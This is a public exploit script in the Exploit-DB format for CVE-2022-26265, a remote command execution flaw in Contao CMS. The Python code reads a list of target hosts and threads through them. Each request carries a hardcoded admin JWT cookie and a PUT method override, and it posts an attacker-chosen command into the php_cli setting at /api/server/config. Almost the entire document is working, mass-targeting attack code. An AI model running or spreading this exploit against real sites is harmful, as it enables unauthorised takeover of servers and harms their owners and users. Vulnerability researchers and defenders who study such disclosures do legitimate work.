# Exploit Title: Contao CMS RCE
# Dork: None
# Date: 2022-03-28
# Exploit Author: Inplex-sys
# Vendor Homepage: https://contao.org/
# Software Link: https://contao.org/en/download.html
# Version: 1.5.0
# Tested on: Debian, Windows
# CVE : CVE-2022-26265

import requests
import sys
import colored
from colored import stylize
import threading
import random
import string

class Main:
    def formatConsoleDate( date ):
        return '[' + date.strftime('%Y-%m-%d-%H:%M:%S') + ']'
        pass

    def randomString( size ):
        return ''.join(random.choice(string.ascii_letters) for _ in range(size))
        pass

    def normalizeUrl( url ):
        if not "://" in url:
            url = "https://" + url
            url = url.rstrip("/")
        return url
        pass

class Exploit:
    def __init__(self, host):
        self.host = host
        pass
    
    def run(self):
        global params

        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Content-Type': 'application/json;charset=utf-8',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'X-Requested-With': 'XMLHttpRequest',
            'X-HTTP-Method-Override': 'PUT',
            'Origin': self.host,
            'Cookie': 'Cookie: contao_manager_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDU2Mjk1MzgsImV4cCI6MTY0NTYzMTMzOCwidXNlcm5hbWUiOiJhZG1pbiJ9.lQCiIXKENysw7omSrUFr1poKfwSf9W0UyAztlXEMIvs'
        }

        response = requests.post(f"{self.host}/api/server/config", headers=header, json={"php_cli": params['command'], "cloud":False})
        print(response.status_code)
        print(response.text)
        pass

def main():
    global params

    print(stylize('''
                 ╦ ╦╔═╗╦═╗╔═╗╔╗ 
                 ╠═╣║ ╦╠╦╝╠═╣╠╩╗
                 ╩ ╩╚═╝╩╚═╩ ╩╚═╝
            test first, analyze after
    ''', colored.fg('red')))

    if len(sys.argv) < 3:
        print(stylize("""
    [ERROR]""", colored.fg('red'),
                      colored.attr('underlined'))
              + """ bad command usage
            """ + stylize("Usage Sheme:", colored.fg('#ffe900'),
                          colored.attr('underlined')) + """
                - user@some_name:~# python3 main.py <vuln-list> <command>
        """)
        sys.exit()
        pass

    params = {}
    params['file'] = sys.argv[1]
    params['command'] = sys.argv[2]

    with open(params['file'], 'r') as file:
        for line in file:
            host = line.strip()
            exploit = Exploit(host)
            threading.Thread(target=exploit.run).start()
            pass
        pass
    pass

if __name__ == "__main__":
    main()
    pass
